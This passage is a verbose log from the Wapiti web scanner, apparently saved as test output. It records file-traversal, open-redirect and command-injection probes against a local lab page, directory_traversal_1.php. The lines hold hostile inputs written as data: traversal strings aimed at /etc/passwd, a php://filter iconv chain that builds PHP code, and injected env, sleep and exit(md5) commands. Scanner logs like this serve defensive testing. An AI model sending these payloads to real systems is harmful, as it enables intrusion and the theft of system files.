+2024-03-20 16:55:10.458 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:55:10.466 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:55:10.473 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:55:10.482 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:55:10.488 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:55:10.496 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:55:10.503 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:55:10.510 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:55:10.517 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp
+2024-03-20 16:55:10.525 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=105%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:55:10.532 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=105%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:55:10.541 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=105%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:55:10.549 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=105%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:55:10.556 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=105%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:55:10.563 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=105%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:55:10.570 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=105%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:55:10.579 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=105%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:55:10.587 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=105%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:55:10.598 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=105%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:55:10.608 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=105%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:55:10.617 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=105%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:55:10.626 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=105%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:55:10.636 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=105%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:55:10.650 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=105%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:55:10.663 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=105%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:55:10.678 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=105%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:55:10.687 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=105%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:55:10.697 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=105%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:55:10.704 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=105%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:55:10.713 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=105%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:55:10.720 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=105%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:55:10.729 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=105%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:55:10.739 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=105%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:55:10.749 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=file%3A%2F%2F%2Fetc%2Fpasswd
+2024-03-20 16:55:10.758 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices
+2024-03-20 16:55:10.766 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd
+2024-03-20 16:55:10.777 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00
+2024-03-20 16:55:10.788 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices
+2024-03-20 16:55:10.798 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00
+2024-03-20 16:55:10.808 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:55:10.817 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:55:10.825 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=directory_traversal_1.php
+2024-03-20 16:55:10.836 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=directory_traversal_1.php%00
+2024-03-20 16:55:10.846 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=directory_traversal_1.php%3A%3A%24DATA
+2024-03-20 16:55:10.881 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module redirect
+2024-03-20 16:55:10.895 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/directory_traversal_1.php?page=fuzz (0)
+2024-03-20 16:55:10.895 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/directory_traversal_1.php?page=https%3A%2F%2Fopenbugbounty.org%2F
+2024-03-20 16:55:10.917 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/directory_traversal_1.php?page=%2F%2Fopenbugbounty.org%2F
+2024-03-20 16:55:10.952 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/directory_traversal_1.php (1)
+2024-03-20 16:55:10.961 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/directory_traversal_1.php?page=message.txt (2)
+2024-03-20 16:55:10.975 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module xss
+2024-03-20 16:55:10.988 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/directory_traversal_1.php?page=fuzz (0)
+2024-03-20 16:55:11.008 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/directory_traversal_1.php (1)
+2024-03-20 16:55:11.017 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/directory_traversal_1.php?page=message.txt (2)
+2024-03-20 16:55:11.031 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=2
+2024-03-20 16:55:11.054 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=105
+2024-03-20 16:55:11.089 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module exec
+2024-03-20 16:55:11.104 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/directory_traversal_1.php?page=fuzz (0)
+2024-03-20 16:55:11.106 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/directory_traversal_1.php?page=%3Benv%3B (0)
+2024-03-20 16:55:11.117 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/directory_traversal_1.php?page=%7Cenv%7C (0)
+2024-03-20 16:55:11.129 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/directory_traversal_1.php?page=a%3Benv%3B (0)
+2024-03-20 16:55:11.144 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/directory_traversal_1.php?page=a%3Benv%3B (0)
+2024-03-20 16:55:11.157 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/directory_traversal_1.php?page=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C (0)
+2024-03-20 16:55:11.166 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/directory_traversal_1.php?page=fuzz%3Benv%3B (0)
+2024-03-20 16:55:11.174 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/directory_traversal_1.php?page=fuzz%0Aenv%3B (0)
+2024-03-20 16:55:11.183 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/directory_traversal_1.php?page=%26set%26 (0)
+2024-03-20 16:55:11.193 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/directory_traversal_1.php?page=set (0)
+2024-03-20 16:55:11.202 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/directory_traversal_1.php?page=env (0)
+2024-03-20 16:55:11.211 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/directory_traversal_1.php?page=%2Fe%00 (0)
+2024-03-20 16:55:11.222 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/directory_traversal_1.php?page=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-20 16:55:11.232 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/directory_traversal_1.php?page=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-20 16:55:11.241 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/directory_traversal_1.php?page=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-20 16:55:11.252 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/directory_traversal_1.php?page=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-20 16:55:11.263 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/directory_traversal_1.php?page=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-20 16:55:11.274 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/directory_traversal_1.php?page=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-20 16:55:11.285 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/directory_traversal_1.php?page=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-20 16:55:11.296 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/directory_traversal_1.php?page=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-20 16:55:11.308 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/directory_traversal_1.php?page=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-20 16:55:11.319 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/directory_traversal_1.php?page=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-20 16:55:11.331 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/directory_traversal_1.php?page=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-20 16:55:11.340 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/directory_traversal_1.php?page=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-20 16:55:11.352 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/directory_traversal_1.php?page=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D (0)
+2024-03-20 16:55:11.362 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/directory_traversal_1.php?page=a%60%29%60 (0)
+2024-03-20 16:55:11.373 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/directory_traversal_1.php?page=a%60sleep%2060%60 (0)
+2024-03-20 16:55:11.383 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/directory_traversal_1.php?page=a%3Bsleep%2060%3B (0)
+2024-03-20 16:55:11.396 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/directory_traversal_1.php?page=a%7Csleep%2060%3B (0)
+2024-03-20 16:55:11.408 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/directory_traversal_1.php?page=%26ping%20-n%2025%20127.0.0.1%26 (0)
+2024-03-20 16:55:11.428 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/directory_traversal_1.php (1)
+2024-03-20 16:55:11.439 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/directory_traversal_1.php?page=message.txt (2)
+2024-03-20 16:55:11.452 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=submit&security_level=2
+2024-03-20 16:55:11.454 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=%3Benv%3B&security_level=2
+2024-03-20 16:55:11.464 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=%7Cenv%7C&security_level=2
+2024-03-20 16:55:11.473 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=a%3Benv%3B&security_level=2
+2024-03-20 16:55:11.482 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=a%3Benv%3B&security_level=2
+2024-03-20 16:55:11.491 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C&security_level=2
